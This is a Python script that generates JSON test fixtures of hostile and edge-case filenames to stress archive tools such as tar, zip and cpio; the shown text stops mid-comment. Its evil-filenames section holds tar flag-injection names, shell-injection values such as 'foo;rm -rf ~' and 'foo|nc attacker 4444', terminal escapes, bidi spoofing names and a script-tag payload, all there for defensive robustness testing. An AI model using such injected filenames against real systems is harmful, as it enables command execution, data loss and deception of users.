#!/usr/bin/env python3
"""
Generate the archive_torture_*.json example fixtures for test_json_fs.

Goal: stress archive format parsers and writers on axes the
big_list_of_naughty_strings_fs.json example does not cover.

This script emits one JSON file per category, matching the existing
example/ convention of focused-purpose test fixtures (like
tartest_test_one_dir.json or bad_s3.json). Eight categories total:

    archive_torture_filename_lengths.json
        Filenames at exactly the byte lengths where tar/ustar/cpio
        switch from inline name fields to extended-header forms.

    archive_torture_path_lengths.json
        Nested directory hierarchies whose total path length hits
        ustar prefix-field, tar block, and PATH_MAX boundaries.

    archive_torture_format_sentinels.json
        Filenames that look like internal markers in tar, zip, JAR,
        OOXML, EPUB, XAR, .deb, OCI, CAB, plus Apple/Windows/Unix
        sentinels and a curated set of nested directory layouts that
        match real archive contents (META-INF/, WEB-INF/, OEBPS/,
        debian/, blobs/sha256/, .git/, etc.).

    archive_torture_size_boundaries_small.json     (~70 KiB total — fast)
    archive_torture_size_boundaries_medium.json    (~400 MiB total — slow)
    archive_torture_size_boundaries_large.json     (~24 GiB total — very slow)
        File sizes at block, page, and int32/int64/octal switch points.

    archive_torture_evil_filenames.json
        Tar flag injection, shell substitution, terminal escapes,
        bidi overrides, NFC/NFD collisions, NFKC compatibility
        collisions, combining-character stacks, Unicode
        noncharacters, Windows-reserved names, leading-dash names,
        format-magic prefixes, zero-width characters.

    archive_torture_mojibake_traps.json
        Filenames whose UTF-8 byte sequences decode as different
        valid text in CP1252, Shift-JIS / CP932, MacRoman, or as
        BOM-marker prefixes that get stripped by sniffers.

mtime/uid/gid boundary testing is not in any of these because
test_json_fs sets those globally per-mount via --mtime/--uid/--gid
CLI flags, not per-entry. To stress those axes, run jsonfs.py
multiple times with different CLI values.

Run:
    python3 generate_archive_torture.py [--output-dir DIR]

By default, the eight JSON files are written to the same directory as
this script (the example/ directory).

Platform notes that affect what you see on the mount
----------------------------------------------------

Filenames in JSON are Unicode strings. What actually ends up on disk
depends on the mount's host filesystem behaviour:

* **macOS (fuse-t / NFS loopback client)**: the macOS kernel's NFS
  client normalises filenames to NFD (decomposed) form between the
  FUSE layer and userspace. A JSON entry with precomposed `café`
  (U+00E9) arrives at `bsdtar` / `os.listdir` as `cafe` + U+0301
  combining acute, two codepoints. This happens REGARDLESS of the
  `--unicode-normalization` option passed to jsonfs.py — the option
  controls how jsonfs.py internally matches lookups, but the kernel
  re-normalises readdir output on its way upward. Two JSON entries
  that differ only by NFC vs NFD encoding COLLIDE on macOS. In
  particular these pairs collapse to one visible file each:
    - `"\u00e9"` (NFC é) + `"e\u0301"` (NFD é)
    - `"hangul_\uac00_syllable"` (precomposed Hangul syllable 가) +
      `"hangul_\u1100\u1161_jamo"` (decomposed Jamo)
    - Any `stack_*` with precomposed base + combining marks.
  The `_nfc` / `_nfd` suffixed entries (`café_nfc`, `café_nfd`, etc.)
  do NOT collide because the suffix itself keeps them distinct; they
  test whether tar round-trips preserve the original encoding through
  a normalising platform (the bytes tar captures on macOS are always
  NFD regardless of what the JSON declared).

* **Linux (ext4 / xfs / btrfs via libfuse)**: byte-literal filenames,
  no kernel-level normalisation. The bytes declared in the JSON
  arrive at userspace exactly as written. NFC and NFD forms of the
  same visible name are two distinct files. The `--unicode-
  normalization` option on jsonfs.py does NOT change readdir output
  on Linux either — it only affects how jsonfs.py internally matches
  inbound lookup requests (so a tool that queries for one
  normalisation form can still find a file stored under another).
  Verified empirically with debian:trixie inside podman:
  `--unicode-normalization NFD`, `NFC`, and `none` all produce
  identical readdir output on Linux. The cross-platform difference
  is therefore purely a property of the macOS kernel's NFS client,
  not of jsonfs.py. Running this torture JSON on Linux produces ~7
  more mount entries than on macOS because the NFC/NFD pair entries
  in category 07 (and the Hangul precomposed/decomposed pair) appear
  as distinct files instead of collapsing.

* **macOS PATH_MAX = 1024 bytes**: files at absolute paths longer
  than 1024 bytes (category 02 entries at total_1023_bytes and
  beyond) exist on the mount but cannot be reached via absolute
  path lookups from userspace. bsdtar uses relative-path traversal
  (`openat` with directory fd), so it CAN reach them — this is
  exactly the stress case category 02 is designed for.

* **Unicode-vs-bytes in JSON strings**: JSON strings are Unicode.
  Filenames containing byte values >= 0x80 cannot be represented as
  raw bytes — they get encoded as UTF-8, turning a single 0x80-0xFF
  byte into a two-byte sequence. This prevents filenames whose first
  bytes are the magic of gzip (`1f 8b`), 7zip (`37 7a bc af 27 1c`),
  or xz (`fd 37 7a 58 5a 00`) from being represented faithfully here.
  Only formats whose full magic is <= 0x7F (zip `PK\x03\x04`, RAR
  `Rar!\x1a\x07`, CAB `MSCF`, XAR `xar!`, bzip2 `BZh`) are included
  in the magic-prefix sentinel set. Testing the >= 0x80 magics
  requires crafting raw bytes, not a Unicode JSON.
"""

import argparse
import json
import os
import sys


# -------- helpers --------

def file_entry(name, size=0):
    return {"type": "file", "name": name, "size": size}


def dir_entry(name, contents):
    return {"type": "directory", "name": name, "size": 4096, "contents": contents}


COMPONENT_LEN = 20  # byte width of each directory name in nested-path trees


def ascii_name(n, marker):
    """Return a filename of exactly n bytes (ASCII only).

    marker is a single-char hint so the crash output tells you which
    length bucket tripped the bug — useful when several lengths are
    processed in one tar run.
    """
    assert n >= 1
    prefix = f"L{n:06d}_{marker}_"
    if len(prefix) >= n:
        return prefix[:n]
    return prefix + "a" * (n - len(prefix))


def nested_path_of_total_length(total_len, leaf_marker):
    """Build a directory hierarchy whose total path length hits total_len.

    Components are kept narrow (COMPONENT_LEN bytes) to stay well under
    the 255-byte NAME_MAX limit; the leaf file consumes the remainder.
    """
    component = "d" * COMPONENT_LEN
    slash = 1
    budget = total_len
    components = []
    while budget > 2 * (COMPONENT_LEN + slash):
        components.append(component)
        budget -= COMPONENT_LEN + slash
    leaf_size = max(1, budget - slash)
    node = file_entry(ascii_name(leaf_size, leaf_marker))
    for comp in reversed(components):
        node = dir_entry(comp, [node])
    return node


# -------- category 1: filename-length boundaries --------

# These test filename bytes, not path bytes. Useful for formats that
# have a flat name field (cpio, zip's filename field in the LFH/CDR,
# gnutar's name handling).
LENGTH_BOUNDARY_LEAFS = [
    99, 100, 101,           # ustar name field boundary (100 bytes)
    154, 155, 156,          # ustar prefix field boundary (155 bytes)
    254, 255,               # NAME_MAX (cannot exceed on most filesystems)
]

# These test full path length via nested directories. Useful for formats
# that store the full path in a fixed field (ustar's combined name+prefix
# is 256 bytes, zip's filename field is 16-bit length so up to 65535).
PATH_BOUNDARY_TOTALS = [
    255, 256, 257,          # POSIX PATH_MAX_ish
    511, 512, 513,          # tar block boundary
    1023, 1024, 1025,       # legacy buffer
    4095, 4096, 4097,       # PATH_MAX on most systems
]
# Deliberately skipping 65535+ because fuse-t/NFS won't mount paths
# that long; testing those requires a direct-crafted archive, not a
# filesystem mount.


def build_filename_length_boundaries():
    contents = []
    for n in LENGTH_BOUNDARY_LEAFS:
        contents.append(file_entry(ascii_name(n, "N")))
    return dir_entry("01_filename_length_boundaries", contents)


def build_path_length_boundaries():
    contents = []
    for total in PATH_BOUNDARY_TOTALS:
        # Each nested tree lives under a wrapper dir so the readable
        # top-level name tells you which total was targeted.
        marker = "P"
        nested = nested_path_of_total_length(total, marker)
        contents.append(dir_entry(f"total_{total}_bytes", [nested]))
    return dir_entry("02_path_length_boundaries", contents)


# -------- category 2: format sentinel names --------

# Names that archive formats reserve for internal use. If a real entry
# has one of these names, parsers may mis-handle it.
# Note: names containing '/' are inherently unreachable via a FUSE mount
# because the '/' gets interpreted as a path separator at creation time.
# Path-traversal names (../escape, etc.) and format markers that contain
# slashes (./PaxHeader/file, ././@LongLink, META-INF/MANIFEST.MF) can
# only be tested by crafting an archive programmatically OR by
# reconstructing the slash-free component names as a nested directory
# hierarchy (which we do separately below via SENTINEL_NESTED).
#
# "." and ".." are also excluded — fuse-t rejects them at mount time
# (they are reserved at the VFS layer for current/parent directory).
SENTINEL_NAMES = [
    # --- tar family ----------------------------------------------
    # PAX global extended header (tar).
    "pax_global_header",
    # PAX per-entry extended header prefix (without trailing path).
    "PaxHeader",
    # Cpio's end-of-archive marker as a regular filename.
    "TRAILER!!!",

    # --- ZIP / JAR / EPUB / OOXML / ODF --------------------------
    # EPUB and ODF require the first file in the zip to be named
    # 'mimetype', uncompressed, no extra fields. A real file literally
    # named 'mimetype' in the middle of a zip confuses EPUB/ODF readers.
    "mimetype",
    # OOXML (docx/xlsx/pptx) root content-types manifest.
    "[Content_Types].xml",
    # JAR manifest (typically at META-INF/MANIFEST.MF, but the bare
    # basename still hits tools that filename-match loosely).
    "MANIFEST.MF",
    # JAR signature block suffixes.
    "SIG-INF.SF",
    "CERT.RSA",
    "CERT.DSA",
    # Java module descriptor (found at the root of a JAR).
    "module-info.class",
    # JPMS multi-release version directory leaf.
    "versions",

    # --- XAR / Apple .pkg ---------------------------------------
    # Apple package format. These names have specific meaning inside
    # a .pkg / .xar and many installer tools look them up by name.
    # A regular file with any of these names inside a xar-ified
    # directory will be misidentified by pkgutil, installer, and
    # some archive browsers as an installer-metadata file.
    "Bom",
    "PackageInfo",
    "Distribution",
    "Payload",
    "Scripts",
    "Resources",
    "Preinstall",
    "Postinstall",
    "Preupgrade",
    "Postupgrade",

    # --- Debian .deb (ar format) --------------------------------
    # A .deb is an ar archive containing exactly these filenames, in
    # this specific order. dpkg enforces the order and the names.
    "debian-binary",
    "control.tar.gz",
    "control.tar.xz",
    "control.tar.zst",
    "data.tar.gz",
    "data.tar.xz",
    "data.tar.zst",
    "_gpgorigin",
    "_gpgbuilder",

    # --- OCI / Docker image -------------------------------------
    # Root of a tar-ified OCI image or a docker save tarball.
    # Runtimes that filename-match on these during load get
    # confused by a user directory containing the same names.
    "manifest.json",
    "config.json",
    "oci-layout",
    "index.json",
    "repositories",
    "layer.tar",

    # --- CAB (Microsoft Cabinet) --------------------------------
    # CAB has no format-internal sentinel filenames — the format is
    # purely binary (CFHEADER / CFFOLDER / CFFILE / CFDATA), and
    # filenames are just stored user data. The closest thing is a
    # handful of Windows-installer conventions. These aren't strong
    # sentinels — they're included as "names likely to appear in
    # cab-based installers" that tools may special-case.
    "setup.exe",
    "setup.dll",
    "setup.inf",
    "WSUSSCAN.cab",
    "Data1.cab",
    "MSI.cab",
    "layout.bin",

    # --- Apple sidecar and macOS volume sentinels --------------
    "._normal_file",
    "._",
    ".DS_Store",
    ".metadata_never_index",
    ".metadata_never_index_unless_rootfs",
    ".Spotlight-V100",

    # --- Windows sentinels --------------------------------------
    "Thumbs.db",
    "desktop.ini",

    # --- Windows device-name leftovers (legal POSIX, reserved NT)
    "CON",
    "PRN",
    "AUX",
    "NUL",
    "COM1",
    "LPT1",

    # --- argv / flag confusion ----------------------------------
    "-rf",
    "--help",
    "-",

    # --- shell-expansion-lookalike filenames --------------------
    "$HOME",
    "$(whoami)",
    "`id`",

    # --- archive-format magic bytes at start of filename --------
    # Tests format auto-detection in readers that recurse into
    # filenames (some virus scanners do this). Only formats whose
    # magic is entirely <= 0x7F are included here. Formats with
    # high bytes (gzip 1F 8B, 7zip 37 7A BC AF 27 1C, xz FD 37 7A)
    # cannot be represented as raw bytes in a JSON Unicode string —
    # a Python literal `\xFD` is U+00FD which UTF-8-encodes as the
    # two bytes C3 BD, not the raw byte FD, so the resulting filename
    # would not actually start with the intended magic. See the
    # module docstring for the full explanation.
    "PK\x03\x04fake_zip_magic",          # zip LFH (low ASCII magic)
    "Rar!\x1a\x07fake_rar4_magic",       # RAR v4 (NUL terminator dropped)
    "Rar!\x1a\x07\x01fake_rar5_magic",   # RAR v5 differs by last byte
    "MSCFfake_cab_magic",                # CAB (the 4-byte "MSCF" alone)
    "xar!fake_xar_magic",                # XAR (the 4-byte "xar!" alone)
    "BZhfake_bzip2_magic",               # bzip2 ("BZh" ASCII prefix)

    # --- whitespace / dot trailing ------------------------------
    "trailing_space ",
    "trailing_dot.",
]


# Sentinel names that contain path separators have to be built as
# nested directory trees rather than flat filenames. When tar-ed, each
# of these produces a stored path matching a real format's internal
# layout, which stress-tests tools that treat tar/zip output as if it
# were an archive of that format.
#
# Each entry is (top_dir, subpath, leaf_name), producing a tree
# top_dir/sub/path/leaf with one file at the leaf.
SENTINEL_NESTED = [
    # JAR / WAR / EAR family.
    ("META-INF", [], "MANIFEST.MF"),
    ("META-INF", ["services"], "java.util.spi.ResourceBundleControlProvider"),
    ("META-INF", ["versions", "9"], "module-info.class"),
    ("META-INF", ["maven", "com.example", "artifact"], "pom.xml"),
    ("META-INF", [], "INDEX.LIST"),
    ("WEB-INF", [], "web.xml"),
    ("WEB-INF", ["lib"], "library.jar"),
    ("WEB-INF", ["classes"], "Main.class"),
    # EPUB container structure.
    ("META-INF", [], "container.xml"),
    ("META-INF", [], "encryption.xml"),
    ("OEBPS", [], "content.opf"),
    ("OEBPS", [], "toc.ncx"),
    # macOS Finder zip sidecar directory.
    ("__MACOSX", [], "._sidecar_file"),
    # Debian source package layout.
    ("debian", [], "control"),
    ("debian", [], "rules"),
    ("debian", [], "changelog"),
    ("debian", ["source"], "format"),
    # OCI blobs directory layout.
    ("blobs", ["sha256"], "0123456789abcdef" * 4),
    # OOXML relationships.
    ("_rels", [], ".rels"),
    ("word", ["_rels"], "document.xml.rels"),
    # Git-inside-tar (a real-world scenario — tarball of a git repo).
    (".git", [], "HEAD"),
    (".git", ["refs", "heads"], "main"),
    (".git", ["objects", "pack"], "pack-0000.idx"),
]


def build_sentinel_names():
    contents = [file_entry(n) for n in SENTINEL_NAMES]
    # Multiple SENTINEL_NESTED entries sharing a top-level directory
    # name (e.g. several META-INF/* leaves) are merged into one tree
    # rather than emitted as duplicate top-level directories.
    trees = {}
    for top, sub, leaf in SENTINEL_NESTED:
        tree = trees.setdefault(top, {"files": [], "subdirs": {}})
        cur = tree
        for part in sub:
            cur = cur["subdirs"].setdefault(
                part, {"files": [], "subdirs": {}}
            )
        cur["files"].append(leaf)

    def materialize(name, node):
        children = [file_entry(f) for f in node["files"]]
        for subname, subnode in sorted(node["subdirs"].items()):
            children.append(materialize(subname, subnode))
        return dir_entry(name, children)

    for top, tree in sorted(trees.items()):
        contents.append(materialize(top, tree))

    return dir_entry("03_format_sentinel_names", contents)


# -------- category 3: size boundaries --------
#
# Three tiers, each with values that hit a known switch point in tar /
# ustar / pax / cpio / zip field-width or buffer-size handling. The
# small tier is fast enough for routine sweeps; the medium tier
# stresses writer buffering with realistic workload; the large tier
# is where int32 / uint32 / int64 / ustar-octal overflow bugs live and
# needs to be run deliberately.

SIZE_TIERS = [
    (
        "04_size_boundaries_small_FAST",
        "size_{n:08d}",
        [
            0, 1, 2,                    # trivial / single byte
            511, 512, 513,              # tar 512-byte block boundary
            1023, 1024, 1025,           # 1 KiB
            4095, 4096, 4097,           # page size
            10239, 10240, 10241,        # libarchive's default write block
            16383, 16384, 16385,        # 16 KiB
        ],
    ),
    (
        "05_size_boundaries_medium_SLOW",
        "size_{n:012d}",
        [
            1048575, 1048576, 1048577,              # 1 MiB
            16777215, 16777216, 16777217,           # 16 MiB
            134217727, 134217728, 134217729,        # 128 MiB
        ],
    ),
    (
        "06_size_boundaries_large_VERY_SLOW",
        "size_{n:013d}",
        [
            8589934591,    # 8 GiB - 1: beyond ustar's 12-byte octal size field
            2147483647,    # 2^31 - 1: signed int32 max
            2147483648,    # 2^31:     first signed-int32 overflow
            4294967295,    # 2^32 - 1: unsigned int32 max
            4294967296,    # 2^32:     forces zip64 extension
            4294967297,    # 2^32 + 1: canary past zip32/zip64 boundary
        ],
    ),
]


def build_size_boundaries(tier):
    label, name_fmt, values = tier
    contents = [file_entry(name_fmt.format(n=n), n) for n in values]
    return dir_entry(label, contents)


def build_size_boundaries_small():
    return build_size_boundaries(SIZE_TIERS[0])


def build_size_boundaries_medium():
    return build_size_boundaries(SIZE_TIERS[1])


def build_size_boundaries_large():
    return build_size_boundaries(SIZE_TIERS[2])


# -------- category 4: evil filenames --------
#
# These target the layer-transitions that archive tooling is most likely
# to get wrong: byte/string/Unicode conversion, display/terminal layers,
# shell-argv boundaries, and cross-platform extraction. Each category is
# commented with the specific bug class it's probing.
#
# Notes on what is deliberately NOT in this list:
# - Literal '/' in a name component: rejected by FUSE at creation time.
# - Literal '\x00' in a name: same.
# - Filenames > 255 bytes: rejected by most host filesystems. Testing
#   these requires reading crafted archives, not creating archives from
#   a mount.
# - Raw byte sequences that aren't valid Unicode (overlong UTF-8, bytes
#   beyond U+10FFFF equivalents): JSON strings are Unicode; these need
#   a different input format.


def build_evil_filenames():
    entries = []

    # --- 1. GNU tar flag injection (documented CVE-class) ------------
    # Any tool that shells out `tar -xf $ARCHIVE $(find ... -print)`
    # without a `--` argument separator lets a filename starting with
    # `-` or `--` become a tar flag. These exist in the wild.
    # NOTE: slashes in filenames are rejected by FUSE, so flag variants
    # that would otherwise contain '/' (like --use-compress-program=/bin/sh)
    # are rewritten to use relative commands.
    for name in [
        "--checkpoint=1",
        "--checkpoint-action=exec=sh attack.sh",
        "--use-compress-program=sh",
        "--to-command=curl-attacker",
        "--wildcards",
        "--exclude=important.conf",
        "-Tfoo",
        "--format=gnu",
    ]:
        entries.append(file_entry(name))

    # --- 2. Shell command substitution / injection -------------------
    # Tests tools that build commands from filenames without quoting.
    # Not tar's fault if a caller misuses it, but these catch bugs in
    # the ecosystem around tar (backup scripts, CI jobs, log rotators).
    for name in [
        "$(id > /tmp/pwn)",
        "`whoami`",
        "foo;rm -rf ~",
        "foo|nc attacker 4444",
        "foo>etc_passwd",    # literal `>`, not redirect (redirect needs real /)
        "foo&bar",
        "${PATH}",
        "$HOME",
    ]:
        entries.append(file_entry(name))

    # --- 3. Newline / tab / CR in filename ---------------------------
    # Breaks every shell script that parses `tar -tvf` output line by
    # line. The filename `foo\nbar` shows as two separate lines in tar
    # output. Any downstream tool iterating tar output as newline-
    # delimited records sees spurious entries.
    for name in [
        "file\nwith\nnewlines",
        "file\twith\ttabs",
        "file\rwith\rcr",
        "file\r\nwith_crlf",
        "file\x0bvertical_tab",
        "file\x0cform_feed",
    ]:
        entries.append(file_entry(name))

    # --- 4. Bidi override filenames (phishing-class) -----------------
    # U+202E RLO makes text display right-to-left in a visually-
    # confusable way. The canonical "innocentexe.pdf" attack, plus
    # variations with LRO, isolates, and embeddings.
    for name in [
        "innocent\u202etxt.exe",           # RLO: displays "innocentexe.txt"
        "report\u202efdp.exe",             # displays "reportexe.pdf"
        "doc\u202dltr_override.pdf",       # LRO
        "mix\u202arle_embed.txt",          # RLE (deprecated)
        "iso\u2066first_strong\u2069end",  # FSI / PDI
        "iso\u2067rli_isolate\u2069end",   # RLI / PDI
    ]:
        entries.append(file_entry(name))

    # --- 5. Terminal escape sequences --------------------------------
    # Tar doesn't sanitise filenames when printing them. A listing like
    # `tar -tvf` in a terminal can be made to do almost anything — set
    # the window title, clear the screen, hide previous output, inject
    # clickable hyperlinks that lead elsewhere, or fake success
    # messages that hide actual errors in CI logs.
    ESC = "\u001b"
    BEL = "\u0007"
    BS = "\u0008"
    for name in [
        f"title{ESC}]0;HACKED{BEL}.txt",              # OSC 0 title setter
        f"clear{ESC}[2J{ESC}[H.txt",                  # CSI clear + home
        # OSC 8 hyperlink — URL can't contain '/' (FUSE rejects), so
        # use a scheme-only marker as the target. Still exercises the
        # OSC 8 parser in terminals.
        f"link{ESC}]8;;evil:link{BEL}click{ESC}]8;;{BEL}.txt",
        f"color{ESC}[31;1mRED{ESC}[0m.txt",           # SGR red bold
        f"backspace{BS}{BS}{BS}{BS}evil.txt",         # backspaces over output
        f"hide{ESC}[8m_hidden_{ESC}[28m.txt",         # conceal attribute
        # DECSC / DECRC save/restore cursor — abused for overwrite tricks
        f"savecur{ESC}7evil{ESC}8.txt",
    ]:
        entries.append(file_entry(name))

    # --- 6. Lone UTF-16 surrogates -----------------------------------
    # U+D800-U+DFFF are valid UTF-16 code units but not valid Unicode
    # scalar values. WTF-8 (Rust's internal encoding for Windows paths)
    # accepts them. Strict UTF-8 rejects them.
    #
    # DELIBERATELY OMITTED from the mount-served test: fuse-t's NFS
    # backend cannot encode lone surrogates in readdir responses (they
    # are not representable in UTF-8), and a single surrogate-bearing
    # entry corrupts the entire directory response — listdir on the
    # directory returns EINVAL and NO entries from the same directory
    # are accessible. This is itself a meaningful finding about
    # test_json_fs's robustness but it prevents testing the tar write
    # path against surrogate filenames via a mount.
    #
    # To test lone surrogates against archive tools: craft a tar/cpio/
    # zip archive directly (from Python with struct.pack, or from a
    # language that allows lone-surrogate byte sequences in filenames
    # at a non-mount layer) and feed it to the archive READ path.

    # --- 7. NFC / NFD collision pairs --------------------------------
    # Same display, different bytes. If the host filesystem normalises
    # (APFS is NFD) and tar round-trips to one that doesn't (ext4 is
    # byte-literal), data gets silently lost or duplicated.
    for name in [
        "caf\u00e9_nfc",         # precomposed é, NFC form
        "cafe\u0301_nfd",        # e + combining acute, NFD form
        "\u00e9",                # lone precomposed é
        "e\u0301",               # lone decomposed é
        # Korean Hangul: single syllable vs Jamo decomposition
        "hangul_\uac00_syllable",      # 가 as single codepoint
        "hangul_\u1100\u1161_jamo",    # ㄱ + ㅏ = same visual 가
    ]:
        entries.append(file_entry(name))

    # --- 8. NFKC compatibility collision -----------------------------
    # Different NFC forms that become identical under NFKC. Bugs in any
    # tool that uses NFKC for comparison (some URL canonicalisers, some
    # filename matchers, HTTP header parsing).
    for name in [
        "file\uff11.txt",        # fullwidth digit 1
        "file1.txt",             # ASCII 1 — same NFKC form
        "file\uff41.txt",        # fullwidth 'a'
        "filea.txt",             # ASCII 'a' — same NFKC form
        "file\u2168.txt",        # Roman numeral IX
        "fileIX.txt",            # ASCII IX — same NFKC form
    ]:
        entries.append(file_entry(name))

    # --- 9. Combining character stacks -------------------------------
    # Valid Unicode, valid UTF-8, but display width and codepoint count
    # diverge. Buffers sized by codepoint count overflow; buffers sized
    # by display width underflow.
    # U+0301 combining acute is 2 bytes UTF-8. Max name is 255 bytes on
    # most filesystems. The prefix "stack_LABEL_" plus base 'a' is about
    # 11-13 bytes; the remaining budget is for combining marks, each 2
    # bytes. Cap at 120 marks for "max" to stay comfortably under 255.
    for n_marks, label in [(10, "small"), (50, "medium"), (120, "max")]:
        entries.append(file_entry(f"stack_{label}_" + "a" + "\u0301" * n_marks))

    # --- 10. Unicode noncharacters -----------------------------------
    # Codepoints Unicode guarantees will never be assigned. Valid UTF-8
    # byte sequences, never a valid character. Some tools strip them,
    # some accept them, some reject — inconsistent handling is the bug.
    for name in [
        "nc_fdd0_\ufdd0",
        "nc_fdef_\ufdef",
        "nc_fffe_\ufffe",
        "nc_ffff_\uffff",
    ]:
        entries.append(file_entry(name))

    # --- 11. Windows reserved device names ---------------------------
    # Legal on POSIX, rejected or silently mangled on Windows during
    # extraction. Round-trip tests through archives intended for cross-
    # platform use should specifically include these.
    for name in [
        "CON",
        "CON.txt",
        "PRN",
        "PRN.log",
        "AUX.tar.gz",
        "NUL",
        "NUL.",
        "COM1",
        "COM1.txt",
        "LPT1",
        "LPT9",
    ]:
        entries.append(file_entry(name))

    # --- 12. Trailing whitespace / dots ------------------------------
    # POSIX keeps these literally. Windows silently strips them during
    # extraction, causing collisions and letting attackers bypass
    # filename suffix blocklists.
    for name in [
        "trailing_space ",
        "trailing_two_spaces  ",
        "trailing_tab\t",
        "trailing_dot.",
        "trailing_two_dots..",
        "trailing_mixed. .",
        "trailing_nbsp\u00a0",
    ]:
        entries.append(file_entry(name))

    # --- 13. Leading-dash filenames ----------------------------------
    # Separate from category 1 (tar-specific flags) — these are generic
    # "looks like an argv option" names that trip lots of tools.
    for name in [
        "-",
        "--",
        "-v",
        "-rf",
        "--help",
        "-o output.tar",
    ]:
        entries.append(file_entry(name))

    # --- 14. Filename is a valid document in another format ----------
    # Tools that embed filenames into JSON logs, YAML manifests, or
    # shell scripts without escaping break on these.
    for name in [
        '{"type":"file","name":"pwn","size":99999999999}',
        '["injected","array"]',
        "---\nkey: value",
        "<?xml version='1.0'?><evil/>",
        "<!DOCTYPE html><script>alert(1)</script>",
    ]:
        entries.append(file_entry(name))

    # --- 15. Filename starts with another archive format's magic ----
    # Tests recursive-archive-detection paths in scanners. ClamAV and
    # similar tools that sniff magic bytes may try to re-parse these as
    # embedded archives.
    for name in [
        "PK\u0003\u0004fake_zip_magic",
        "7z\u00bc\u00af'\u001cfake_7zip_magic",
        "Rar!\u001a\u0007\u0000fake_rar_magic",
        "ustar\u0000fake_tar_magic",
        "\u001f\u008bfake_gzip_magic",
        "MSCF\u0000\u0000fake_cab_magic",
        "xar!\u0000\u001cfake_xar_magic",
    ]:
        entries.append(file_entry(name))

    # --- 16. Zero-width and invisible characters ---------------------
    # Distinct from combining marks: these are assigned characters that
    # occupy zero display width. Filenames that LOOK identical but
    # differ in invisible characters break filename-based deduplication
    # and access-control rules.
    for name in [
        "zerowidth_a\u200bzero_width_space",     # U+200B ZWSP
        "zerowidth_b\u200czero_width_nonjoin",   # U+200C ZWNJ
        "zerowidth_c\u200dzero_width_join",      # U+200D ZWJ
        "zerowidth_d\ufeffzero_width_nbsp",      # U+FEFF BOM / ZWNBSP
        "zerowidth_e\u180ezero_width_mvs",       # U+180E Mongolian vowel sep
    ]:
        entries.append(file_entry(name))

    # Belt-and-braces: any entry containing '/' or U+0000 would be
    # silently filtered by FUSE at mount time. The category sources
    # above are already free of these, but the filter guards against
    # accidental reintroduction.
    entries = [
        e for e in entries
        if "/" not in e["name"] and "\u0000" not in e["name"]
    ]

    return dir_entry("07_evil_filenames", entries)


# -------- category 8: mojibake traps --------
#
# Filenames whose UTF-8 byte sequences decode as valid-but-different
# text in some other encoding that legacy archive tools still use.
# Targets tools that auto-detect filename encoding, hard-code a
# non-UTF-8 default (CP1252, CP932/Shift-JIS, MacRoman), or sniff
# byte-order marks.
#
# These don't crash UTF-8-native code (libarchive is UTF-8 or PAX-
# extended). They do catch bugs in Windows Explorer's built-in zip
# support, older 7-Zip, Java zipfile without -Dsun.zip.encoding=UTF-8,
# Python zipfile before metadata_encoding support, and shell scripts
# that do `tar -tvf | while read name` under a non-UTF-8 locale.


def build_mojibake_traps():
    entries = []

    # The canonical café mojibake. UTF-8 of "café.txt" is the bytes
    # 63 61 66 C3 A9 2E 74 78 74. Decoded as Latin-1 / CP1252, the
    # C3 A9 pair becomes "Ã©", so the filename appears as "cafÃ©.txt".
    # Round-trip through a CP1252-assuming tool silently mangles.
    entries.append(file_entry("caf\u00e9.txt"))

    # The inverse double-mojibake trap. This filename in UTF-8 IS
    # "cafÃ©.txt" — valid characters. A tool that re-decodes these
    # bytes as CP1252 produces "cafÃƒÂ©.txt" (two layers of mojibake
    # stacked). Users who created this filename thinking it was a
    # one-time-mangled "café" get further mangling on re-round-trip.
    entries.append(file_entry("caf\u00c3\u00a9.txt"))

    # UTF-8 BOM prefix (U+FEFF). BOM-sniffing decoders strip the first
    # three bytes (EF BB BF) as an encoding marker, so the stored
    # filename `<BOM>file.txt` becomes `file.txt` after sniffing —
    # colliding with any real `file.txt` in the same archive.
    entries.append(file_entry("\ufefffile.txt"))

    # Yen-sign vs backslash. In Shift-JIS, byte 0x5C is the YEN SIGN
    # character, not a backslash. Unicode U+00A5 (¥) encodes to UTF-8
    # as C2 A5. A Shift-JIS-assuming decoder interprets those bytes
    # as the second byte of a DBCS character rather than a yen sign
    # standalone, giving a completely different filename.
    entries.append(file_entry("path\u00a5separator.txt"))

    # CP1252-specific high-ASCII range (0x80-0x9F). In strict Latin-1
    # these bytes are undefined; in CP1252 they are printable
    # characters (€, „, „, …, etc.). U+20AC (€) encodes as E2 82 AC —
    # the 82 byte is CP1252's "low quotation mark", so CP1252 decoders
    # see different text than UTF-8 decoders.
    entries.append(file_entry("price_\u20ac_euro.txt"))

    # Fullwidth reverse solidus (U+FF3C). Encodes in UTF-8 as EF BC BC.
    # In Shift-JIS / CP932, the byte pair EF BC or BC BC looks like
    # valid DBCS leading-byte territory, and the decoder parses
    # completely different characters. Worth testing because CJK
    # fullwidth punctuation is common in East Asian filenames.
    entries.append(file_entry("cjk\uff3csolidus.txt"))

    # Non-breaking space (U+00A0). Encodes as C2 A0 in UTF-8. In
    # Latin-1 / CP1252, C2 is "Â" and A0 is NBSP, so the filename
    # appears to contain a visible Â followed by an invisible space —
    # a visible-to-invisible character transition that depends
    # entirely on the decoder.
    entries.append(file_entry("nbsp\u00a0trap.txt"))

    # Double-decoded UTF-8: a filename whose UTF-8 bytes decode to
    # characters whose UTF-8 encoding was ALREADY mojibake. Iteratively
    # wrong decoders produce iteratively wrong output. This specific
    # string (cafÃƒÂ©) is the result of decoding "café.txt" as CP1252
    # then re-encoding as UTF-8.
    entries.append(file_entry("caf\u00c3\u0083\u00c2\u00a9.txt"))

    # Shift-JIS half-width katakana range (0xA1-0xDF). In Shift-JIS
    # these are single-byte katakana; in CP1252 they are Latin-1
    # accented letters; in UTF-8 they're invalid as leading bytes.
    # Encoding this as UTF-8 first means U+FF71 (half-width KA) as
    # E3 BD B1 — decoded as Shift-JIS, byte BD is half-width katakana
    # 'ス' standalone, and B1 is 'ア'.
    entries.append(file_entry("halfwidth_\uff71\uff72\uff73.txt"))

    # Emoji that's a supplementary-plane character. UTF-8 encoding of
    # U+1F600 (😀) is 4 bytes F0 9F 98 80. Any tool that uses UCS-2
    # (fixed 16-bit) internally truncates or corrupts this, because
    # the character is outside the BMP. Java's internal String
    # representation uses UTF-16 surrogate pairs correctly, but older
    # Windows-centric tools that pass filenames through UCS-2 APIs
    # lose the supplementary bits.
    entries.append(file_entry("emoji_\U0001f600_smiley.txt"))

    # Deliberate double-encoded UTF-8 — this string is the UTF-8
    # of the UTF-8 of "é". Three bytes C3 83 C2 A9 decode as "Ã©"
    # in UTF-8, which is what you get if you UTF-8-encode "é" twice.
    # A tool that normalizes this back to "é" has a "fix mojibake"
